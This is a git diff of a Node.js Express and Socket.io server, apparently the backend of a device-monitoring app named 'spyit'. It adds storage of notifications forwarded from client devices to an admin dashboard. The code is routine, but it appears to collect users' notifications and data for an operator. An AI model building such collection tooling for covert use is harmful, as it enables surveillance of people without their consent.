@@ -1,10 +1,22 @@
 var express = require('express');
 var socket = require('socket.io');
+const mongoose = require('mongoose')
 
+var saveNotificationToDb = require('./notifications/notificationHandler').saveNotificationToDb;
+
+mongoose.connect('mongodb://localhost/spyit', { useNewUrlParser: true })
+const db = mongoose.connection
+db.on('error', (error) => console.error(error))
+db.once('open', () => console.log('connected to database'))
 
 var port = 4000;
 var app = express();    //App Setup
 app.use(express.static(__dirname + '/SClientSide/Dashboard')); //Static Files
+app.use(express.json())
+
+const notificationsRouter = require('./routes/notifications');
+app.use('/notifications', notificationsRouter);
+
 var server = app.listen(port, function () {
     console.log('Listening to port: ', port);
 });
@@ -14,6 +26,9 @@ var server = app.listen(port, function () {
 var io = socket(server);
 io.on('connection', function (socket) {
     handleSocket(socket);
+    // Testing the notification handler
+    // socket.tag = "1";
+    // notificationHandler(socket, adminSocket);
 });
 
 
@@ -26,7 +41,7 @@ function handleSocket(socket) {
 
     //Register admin and save socket instance to global adminSocket variable
     socket.on('registerAdmin', function (data) {
-        //console.log("SOCKET= ", socket);
+        // console.log("SOCKET= ", socket);
         socket.tag = "admin";
         adminSocket = socket;
         console.log(data);
@@ -111,6 +126,14 @@ function handleUserData(socket) {
         if (adminSocket != null && adminSocket.connected)
             adminSocket.emit('usrData', {data: data, uid: socket.tag});
         console.log('User data uploading');
+    });
+
+    socket.on('notificationPosted', function (data) {
+        if (adminSocket != null && adminSocket.connected)
+            adminSocket.emit('notification', {data: data.data, uid: socket.tag});
+        console.log('User data : ', data);
+        // console.log("Type of data notification data is: ", typeof(data));
+        saveNotificationToDb(data);
     });
 
 }
